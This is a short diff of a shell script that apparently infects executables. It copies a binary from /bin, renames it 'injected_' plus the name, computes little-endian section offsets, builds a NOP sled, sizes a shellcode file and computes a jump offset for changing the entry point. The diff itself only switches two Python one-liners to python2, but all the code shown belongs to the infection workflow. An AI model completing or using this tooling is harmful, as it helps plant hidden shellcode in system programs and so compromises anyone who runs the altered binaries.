@@ -17,7 +17,7 @@ cp /bin/$bin .
 mv ./$bin injected_$bin
 
 # Compute Section offset in little endian
-LittleEndianSecOffset=$(python -c "from textwrap import wrap  as w ; print  ''.join(w('$SectionOffset'[2:],2)[::-1]) ")
+LittleEndianSecOffset=$(python2 -c "from textwrap import wrap  as w ; print  ''.join(w('$SectionOffset'[2:],2)[::-1]) ")
 echo "LESO=$LittleEndianSecOffset"
 
 # Generate 100bytes of nops
@@ -46,7 +46,7 @@ sc_size=$(wc -c shellcode| cut -d\  -f 1)
 echo "size of shellcode :$sc_size bytes"
 
 # offset to write jmp entry
-offset=`python -c "print hex(int($sc_size) + $SectionOffset)"` 
+offset=`python2 -c "print hex(int($sc_size) + $SectionOffset)"` 
 echo "jmp entry offset=$offset"
 
 # Changing Entry and injecting payload
